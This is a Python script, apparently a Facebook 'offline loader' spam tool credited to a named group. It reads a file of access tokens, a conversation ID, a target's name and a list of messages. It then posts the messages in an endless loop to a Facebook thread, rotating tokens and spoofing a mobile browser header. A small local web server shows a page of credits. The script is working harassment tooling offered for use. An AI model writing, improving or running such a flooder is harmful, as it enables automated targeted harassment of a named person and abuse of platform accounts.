import requests
import json
import time
import sys
from platform import system
import os
import socketserver
import http.server
import threading
from datetime import datetime
from datetime import datetime

import requests
import os
import sys
import uuid
import time


html_content = """
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Venom Wanted Rullex</title>
    <style>
        body {
            background-image: url('rashmika.jpg');
            background-size: cover;
        }
    </style>
</head>
<body>
    <h1 style="color: black;">V3N0M W4NT3D RULL3X 0FFLIN3 T00L</h1>
    <p style="color: green;">This Tool Created By Harsh Sing Rajput</p>
    
    <p style="color: blue;">Owner Name ::- Siddharth Raj</p>
    
    <p style="color: gray;">Members List ::- </p>
    <ul>
        <li style="color: black;">1. Harsh Rajput</li>
        <li style="color: purple;">2. Ashu</li>
        <li style="color: orange;">3. Saiyan</li>
        <li style="color: teal;">4. Rudra</li>
        <li style="color: navy;">5. Aariz</li>        
    </ul>

    <audio controls autoplay loop>
        <source src="https://pagalsong.in/download/14337/I%20Love%20You%20128%20KBPS%20mp3" type="audio/mpeg">
        Your browser does not support the audio element.
    </audio>
</body>
</html>
"""

# Code for the server handler
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html_content.encode())


def execute_server():
	PORT = 4000

	with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
		print("Offline Loader Running at http://localhost:{}".format(PORT))
		httpd.serve_forever()


def send_messages():
    


    with open('TokenFile.txt', 'r') as file:
        tokens = file.readlines()
    num_tokens = len(tokens)

    

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }


    access_tokens = [token.strip() for token in tokens]

    with open('inbox.txt', 'r') as file:
        convo_id = file.read().strip()

    with open('notepad.txt', 'r') as file:
        text_file_path = file.read().strip()
        

    with open('notepad.txt', 'r') as file:
        messages = file.readlines()
            

    num_messages = len(messages)
    max_tokens = min(num_tokens, num_messages)

    with open('kidxname.txt', 'r') as file:
        haters_name = file.read().strip()

    with open('time.txt', 'r') as file:
        speed = int(file.read().strip())
        

    while True:
        try:
            for message_index in range(num_messages):
                token_index = message_index % max_tokens
                access_token = access_tokens[token_index]

                message = messages[message_index].strip()

                url = "https://graph.facebook.com/v15.0/{}/".format('t_' + convo_id)
                parameters = {
                    'access_token': access_token,
                    'message': haters_name + ' ' + message
                }
                response = requests.post(url, json=parameters, headers=headers)

                e =datetime.now()

                if response.ok:
                    print("\033[1;32;40m", end = "")
                    print("\n")
                    print (e.strftime("--> V3N0M W4NT3D RULL3X H3R3 :D | | Date :: %d-%m-%Y  TIME :: %I:%M:%S %p"))
                    print("--> Message Successfully Sent By Token {} ::-->> {}".format(
                        token_index + 1,
                        haters_name + ' ' + message), "\n")
                        
           
                    
                else:
                    print("\033[1;31;40m", end = "")
                    print (e.strftime("--> V3N0M W4NT3D RULL3X H3R3 :D | | Date :: %d-%m-%Y  TIME :: %I:%M:%S %p"))
                    print("--> Message Not Sent By Token {} ::-->> {}".
                        format(token_index + 1,
                            haters_name + ' ' + message), "\n")

                time.sleep(speed)

            print("\033[1;34;40m", end = "")
            print("\n[✓] All Messages Successfully Sent. Restarting the process [✓] \n")
        except Exception as e:
            print("[×] An error occurred: {}".format(e))
            time.sleep(20)

def main():
    server_thread = threading.Thread(target=execute_server)
    server_thread.start()

    send_messages()

if __name__ == '__main__':
    main()